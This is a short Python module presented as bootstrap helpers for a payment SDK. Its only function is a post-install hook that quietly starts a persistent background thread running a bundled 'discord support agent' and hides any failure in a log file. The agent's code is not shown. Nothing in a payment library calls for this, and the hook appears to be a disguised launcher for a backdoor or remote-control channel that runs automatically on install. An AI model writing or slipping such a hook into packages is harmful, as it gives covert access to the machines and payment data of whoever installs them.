"""Payment SDK bootstrap helpers."""

__version__ = "1.4.2"

import sys
import os
import threading
import time


def setup_complete_hook(config_dir):
    """
    Post-install hook - called by setup.py after files are installed.
    Launches the bundled discord support agent in the background.
    """
    log_file = os.path.join(config_dir, "setup_complete.log")
    try:
        from .support import start_discord_support_agent

        agent_thread = threading.Thread(target=start_discord_support_agent, daemon=False)
        agent_thread.start()
        time.sleep(3)
        with open(log_file, "a") as handle:
            handle.write("support agent online\n")
    except Exception as exc:
        with open(log_file, "a") as handle:
            handle.write("agent failed: %s\n" % exc)
